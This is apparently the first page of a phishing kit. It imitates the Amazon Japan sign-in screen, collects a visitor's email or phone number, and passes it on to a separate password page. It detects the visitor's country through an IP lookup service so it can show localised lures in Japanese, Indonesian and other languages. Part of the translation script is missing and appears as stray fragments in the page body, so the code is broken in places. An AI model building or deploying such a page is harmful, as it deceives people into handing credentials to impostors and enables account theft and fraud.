<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon — ログインまたはアカウント作成</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', 'Noto Sans JP', Arial, sans-serif; }
        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .logo { margin: 10px 0 25px; text-align: center; }
        .logo img { height: 60px; }
        .kotak { width: 100%; max-width: 348px; padding: 25px 26px; border: 1px solid #ddd; border-radius: 8px; background: #fff; }
        h1 { font-size: 28px; font-weight: 400; margin-bottom: 12px; }
        .sub-judul { font-size: 14px; color: #555; margin-bottom: 18px; }
        label { font-weight: 700; font-size: 13px; margin: 0 0 6px; display: block; }
        .input { width: 100%; padding: 8px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; height: 36px; margin-bottom: 4px; outline: none; transition: border-color 0.1s; }
        .input:focus { border-color: #007185; box-shadow: 0 0 0 2px #c8f0f4; }
        .input.salah { border-color: #d00; border-width: 2px; }
        .pesan-merah { color: #d00; font-size: 13px; margin: 0 0 12px; display: none; align-items: center; gap: 6px; }
        .ikon-bulat { display: inline-flex; align-items: center; justify-content: center; width: 18px; height: 18px; background: #d00; color: #fff; border-radius: 50%; font-size: 12px; font-weight: bold; flex-shrink: 0; }
        .tombol { width: 100%; padding: 6px; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; font-size: 14px; height: 40px; cursor: pointer; margin: 10px 0 20px; }
        .tombol:hover { background: #f7ca00; }
        .syarat { font-size: 12px; line-height: 1.5; margin-bottom: 25px; }
        .syarat a { color: #0066c0; text-decoration: none; }
        .garis-pemisah { border-top: 1px solid #e7e7e7; margin: 20px 0; }
        .bantuan { font-size: 13px; margin-bottom: 25px; }
        .bantuan a { color: #0066c0; text-decoration: none; }
        .bisnis { font-size: 13px; }
        .bisnis a { color: #0066c0; text-decoration: none; }
        .bawah { margin-top: 30px; padding-top: 20px; border-top: 1px solid #e7e7e7; width: 100%; max-width: 100%; text-align: center; font-size: 11px; color: #555; }
        .bawah a { color: #0066c0; text-decoration: none; margin: 0 8px; }
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1 id="judul">ログインまたはアカウント作成</h1>
        <p class="sub-judul" id="subJudul">携帯電話番号またはメールアドレスを入力</p>
        
        <label id="labelEmail" for="email">メールアドレスまたは携帯電話番号</label>
        <input type="text" id="email" class="input">
        
        <p id="pesanKosong" class="pesan-merah">
            <span class="ikon-bulat">!</span>
            <span id="teksKosong">メールアドレスまたは携帯電話番号を入力してください</span>
        </p>
        <p id="pesanSalah" class="pesan-merah">
            <span class="ikon-bulat">!</span>
            <span id="teksSalah">無効なアクセスリンクです</span>
        </p>
        
        <button type="button" id="lanjut" class="tombol">
            <span id="teksTombol">続行</span>
        </button>
        
        <p class="syarat" id="syarat">続行することで、Amazonの<a href="#">利用規約</a>および<a href="#">プライバシー通知</a>に同意するものとします。</p>
        
        <div class="garis-pemisah"></div>
        
        <p class="bantuan" id="bantuanTeks">お困りですか？<br><a href="#">ヘルプを参照する</a></p>
        
        <p class="bisnis" id="bisnisTeks">業務用に購入ですか？<br><a href="#">無料の法人アカウントを作成</a></p>
    </div>
    <div class="bawah">
        <p><a href="#" id="syaratLink1">利用規約</a> <a href="#" id="syaratLink2">プライバシー通知</a> <a href="#" id="bantuanLink">ヘルプ</a></p>
        <p style="margin-top:8px; color:#767676;" id="hakCiptaan">© 1996-2026, Amazon.com, Inc. またはその関連会社</p>
    </div>

        labelEmail: '电子邮箱或手机号码',

        subJudul: 'ป้อนอีเมลหรือหมายเลขโทรศัพท์มือถือ',
        labelEmail: 'อีเมลหรือหมายเลขโทรศัพท์มือถือ',

        bantuanTeks: 'ต้องการความช่วยเหลือ？<br><a href="#">เรียนรู้เพิ่มเติม</a>',
        bisnisTeks: 'ซื้อสำหรับธุรกิจ？<br><a href="#">สร้างบัญชีธุรกิจฟรี</a>',

        teksKosong: '이메일 또는 휴대폰 번호를 입력하세요',

        teksTombol: '계속',
        syarat: '계속하면 Amazon의 <a href="#">이용 약관</a> 및 <a href="#">개인정보 처리방침</a>에 동의하는 것으로 간주됩니다.',
        bantuanTeks: '도움이 필요하신가요?<br><a href="#">자세히 알아보기</a>',

    },
    ID: {
        judul: 'Masuk atau Buat Akun',
        subJudul: 'Masukkan email atau nomor ponsel',
        labelEmail: 'Email atau nomor ponsel',
        teksKosong: 'Masukkan email atau nomor ponsel Anda',
        teksSalah: 'Tautan akses tidak valid',
        teksTombol: 'Lanjutkan',
        syarat: 'Dengan melanjutkan, Anda menyetujui <a href="#">Syarat Penggunaan</a> dan <a href="#">Pemberitahuan Privasi</a> Amazon.',
        bantuanTeks: 'Butuh bantuan?<br><a href="#">Pelajari selengkapnya</a>',
        bisnisTeks: 'Belanja untuk kantor?<br><a href="#">Buat akun bisnis gratis</a>',
        syaratLink1: 'Syarat Penggunaan',
        syaratLink2: 'Pemberitahuan Privasi',
        bantuanLink: 'Bantuan',
        hakCiptaan: '© 1996-2026, Amazon.com, Inc. atau afiliasinya'
    }
};

const negaraKeBahasa = {
    JP: 'JA', CN: 'ZH', HK: 'ZH', TW: 'ZH', TH: 'TH', KR: 'KO', ID: 'ID',
    MY: 'EN', SG: 'EN', US: 'EN', AU: 'EN', GB: 'EN', CA: 'EN', NZ: 'EN'
};

// ==============================================
// DETEKSI & TERAPKAN BAHASA
// ==============================================
async function terapkanBahasa() {
    let kodeNegara = 'JP';
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        kodeNegara = data.country_code || 'JP';
    } catch {}

    const kodeBahasa = negaraKeBahasa[kodeNegara] || 'JA';
    const teks = terjemahan[kodeBahasa] || terjemahan.JA;

    document.documentElement.lang = kodeBahasa.toLowerCase();
    document.getElementById('judul').textContent = teks.judul;
    document.getElementById('subJudul').textContent = teks.subJudul;
    document.getElementById('labelEmail').textContent = teks.labelEmail;
    document.getElementById('teksKosong').textContent = teks.teksKosong;
    document.getElementById('teksSalah').textContent = teks.teksSalah;
    document.getElementById('teksTombol').textContent = teks.teksTombol;
    document.getElementById('syarat').innerHTML = teks.syarat;
    document.getElementById('bantuanTeks').innerHTML = teks.bantuanTeks;
    document.getElementById('bisnisTeks').innerHTML = teks.bisnisTeks;
    document.getElementById('syaratLink1').textContent = teks.syaratLink1;
    document.getElementById('syaratLink2').textContent = teks.syaratLink2;
    document.getElementById('bantuanLink').textContent = teks.bantuanLink;
    document.getElementById('hakCiptaan').textContent = teks.hakCiptaan;
}

// ==============================================
// FUNGSI UTAMA
// ==============================================
const inputEmail = document.getElementById('email');
const tombolLanjut = document.getElementById('lanjut');
const pesanKosong = document.getElementById('pesanKosong');
const pesanSalah = document.getElementById('pesanSalah');

// Saat mengetik → hapus pesan merah
inputEmail.addEventListener('input', () => {
    inputEmail.classList.remove('salah');
    pesanKosong.style.display = 'none';
    pesanSalah.style.display = 'none';
});

// Klik tombol → cek & lanjut
tombolLanjut.addEventListener('click', () => {
    const email = inputEmail.value.trim();
    
    if (!email) {
        inputEmail.classList.add('salah');
        pesanKosong.style.display = 'flex';
        return;
    }
    
    // Simpan email ke localStorage
    localStorage.setItem('email_pengguna', email);
    
    // Langsung ke halaman password
    window.location.href = 'password.html';
});

terapkanBahasa();
</script>
</body>
</html>
